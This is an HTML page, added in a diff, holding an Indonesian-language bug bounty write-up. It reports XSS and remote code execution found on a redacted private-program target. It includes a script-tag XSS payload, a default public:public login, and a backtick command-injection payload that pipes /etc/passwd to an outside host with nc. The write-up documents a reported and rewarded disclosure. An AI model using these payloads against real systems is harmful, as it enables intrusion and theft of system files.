@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="your description">
+    <meta name="Author" content="Mas Zet">
+    <meta name="keywords" content="exploit security bugbounty">
+    <link rel="stylesheet" href=css/syntax.css>
+    <link rel="stylesheet" href=css/style.css>
+    <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
+    <title>zetc0de — IT Security Enthusiast</title>
+  </head><body><aside id="sidenav">
+    <header>
+    
+        <a href=><img src="avatar.png" alt="avatar"></a>
+        
+    
+
+    <a id="branding" href=>
+        
+            zetc0de — IT Security Enthusiast
+        
+    </a>
+    </header>
+
+    <nav>
+        
+            		
+            <a href="/"
+                
+            >
+                <i class="fas fa-home fa-sm"></i>
+                <span>home</span>
+            </a>
+        
+            		
+            <a href="/post"
+                
+            >
+                <i class="fas fa-keyboard fa-ms"></i>
+                <span>blog</span>
+            </a>
+        
+            		
+            <a href="/tags"
+                
+            >
+                <i class="fas fa-tags fa-ms"></i>
+                <span>tags</span>
+            </a>
+        
+            		
+            <a href="https://github.com/zetc0de"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-github fa-ms"></i>
+                <span>github</span>
+            </a>
+        
+            		
+            <a href="/index.xml"
+                
+            >
+                <i class="fas fa-rss fa-ms"></i>
+                <span>RSS</span>
+            </a>
+        
+            		
+            <a href="/contact"
+                
+            >
+                <i class="far fa-envelope"></i>
+                <span>contact</span>
+            </a>
+        
+    </nav>
+</aside>
+<main id="main">
+            <a href="javascript:void(0)" id="closebtn" onclick="navToggle()"><i class="fas fa-bars fa-lg"></i></a>
+            <div class="content">
+    
+    <h1 id="title">[Bug Bounty] RCE and XSS on Private Program Cyber Army ID</h1>
+    
+      
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#bprologb"><!-- raw HTML omitted -->Prolog<!-- raw HTML omitted --></a></li>
+        <li><a href="#breconnaissanceb"><!-- raw HTML omitted -->Reconnaissance<!-- raw HTML omitted --></a></li>
+        <li><a href="#bxss-via-post-request"><!-- raw HTML omitted -->XSS via POST Request</a></li>
+        <li><a href="#poc-">POC :</a></li>
+        <li><a href="#bremote-code-executionb"><!-- raw HTML omitted -->Remote Code Execution<!-- raw HTML omitted --></a></li>
+        <li><a href="#breferenceb"><!-- raw HTML omitted -->Reference:<!-- raw HTML omitted --></a></li>
+        <li><a href="#bthanksb"><!-- raw HTML omitted -->Thanks:<!-- raw HTML omitted --></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    <h3 id="bprologb"><!-- raw HTML omitted -->Prolog<!-- raw HTML omitted --></h3>
+<p>Lagi naik KRL dari Tangerang-Jakarta, sambil main HP tiba-tiba ada email undangan private program di <a href="https://www.cyberarmy.id/">Cyber Army</a>,langsung cuz klik terima. Malamnya gw lihat detail programnya, disana diberikan 2 alamat yang masuk dalam scope, yaitu  sub.[redacted].id dan subdomain.[redacted].id, ternyata 2 domain tersebut terdapat dalam 1 server dengan aplikasi yang serupa, jadi total ada 6 vuln yang saya temukan.</p>
+<ul>
+<li>4 XSS</li>
+<li>2 RCE</li>
+</ul>
+<h3 id="breconnaissanceb"><!-- raw HTML omitted -->Reconnaissance<!-- raw HTML omitted --></h3>
+<p>Pada tahap reconnaissance,saya menggunakan nmap dengan perintah
+<code>nmap sub.[redacted].id</code></p>
+<p>Disana terdapat beberapa port yang open, saya tertarik dengan port 8010. Pada saat tulisan ini dibuat saya coba scan lagi ternyata sudah filtered.</p>
+<!-- raw HTML omitted -->
+<p>Saat saya buka sub.[redacted].id:8010, disana terdapat form login yang diketahui credentialnya menggunakan user dan password public:public. Disana terdapat beberapa menu (lupa screenshot).</p>
+<h3 id="bxss-via-post-request"><!-- raw HTML omitted -->XSS via POST Request</h3>
+<p>Untuk metode XSS ini berdampak pada 2 fungsi/menu:</p>
+<ul>
+<li>Menu dblist</li>
+<li>Menu dnsbse</li>
+</ul>
+<p>Saya tertarik dengan fungsi search yg ada di menu dnsbse, disana ada form search yang merequest google search engine. Saya coba searcing &ldquo;test&rdquo;, ternyata inputan kita ditampilkan di browser,hmmmm&hellip; Langsung terpikir untuk input payload XSS, dengan mengirim payload XSS sejuta ummat <code>&quot;&gt;&lt;script&gt;alert(&quot;p00w&quot;)&lt;/script&gt;</code> ternyata payload dirender dengan baik.</p>
+<h3 id="poc-">POC :</h3>
+<ul>
+<li>Script : <a href="https://pastebin.com/raw/zZN1pfSY">https://pastebin.com/raw/zZN1pfSY</a></li>
+</ul>
+<!-- raw HTML omitted -->
+<h3 id="bremote-code-executionb"><!-- raw HTML omitted -->Remote Code Execution<!-- raw HTML omitted --></h3>
+<p>Masih ingat menu dnsbse? Tadi yang kita bahas kalau fungsi dnsbse juga merequest search engine google dan menampilkan hasilnya disana. Saya tebak kalau fungsi dnsbse itu pake curl buat request ke server googlenya,asumsinya kira-kira seperti ini:
+<code>shell_exec('curl {website with request}')</code></p>
+<p>Saya pikir ini bisa diexploitasi dengan SSRF (Server Side Request Forgery);</p>
+<!-- raw HTML omitted -->
+<p>setelah mencoba beberapa payload SSRF, ternyata zonk wwkwkw <code>&gt;_&lt;</code> 
+Saya sambil baca-baca referensi, akhirnya ketemu cara bypass stringnya hanya menggunakan backtick, sehingga kita dapat menjalankan perintah shell pada <code>shell_exec</code> tadi.</p>
+<p>Saya masukin request ke repeater di burp, lalu saya masukin payload <code>cat /etc/passwd | nc XXX.199.221.101 9091</code> pada parameter server, dan didapatkan result:</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<ul>
+<li>12 February Send Report</li>
+<li>13 February Validation</li>
+<li>14 February disclose</li>
+<li>Rewarded</li>
+</ul>
+<h3 id="breferenceb"><!-- raw HTML omitted -->Reference:<!-- raw HTML omitted --></h3>
+<ul>
+<li><a href="https://medium.com/@uranium238/getting-a-rce-ctf-way-2fd612fb643f">https://medium.com/@uranium238/getting-a-rce-ctf-way-2fd612fb643f</a></li>
+</ul>
+<h3 id="bthanksb"><!-- raw HTML omitted -->Thanks:<!-- raw HTML omitted --></h3>
+<ul>
+<li>Ngesec</li>
+<li>Surabaya Hacker Link</li>
+<li>You!</li>
+</ul>
+
+    
+    <div class="nav-next-prev">
+        <div class="nav-prev">
+            
+                <a href="/post/2019-01-09-antihack.me-csrf-file-upload-vulnerability/"><i class="fas fa-chevron-left"></i></a>
+            
+        </div>
+        <a class="nav-top" href="#">top</i></a>
+        <div class="nav-next">
+            
+                <a class="grayed-out" href="javascript:void()"><i class="fas fa-chevron-right"></i></a>
+            
+        </div>
+    </div>
+    
+
+            </div><footer>
+<div class="footer-content">
+
+  <div class="contact-info">
+      
+          <div class="footer-mail">
+          <i class="far fa-envelope"></i> <a href="mailto:zetc0de.id@gmail.com">zetc0de.id@gmail.com</a> </div>
+      
+      
+      <div class="footer-phone">
+          <i class="fas fa-phone"></i> https://t.me/zetc0de 
+      </div>
+      
+  </div>
+
+
+<p class="copyright meta">Copyright © 2008–2019, Steve Francia and the Hugo Authors; all rights reserved.</p>
+
+</div>
+</footer></main>
+    </body>
+    <script src=js/navbutton.js></script>
+</html>
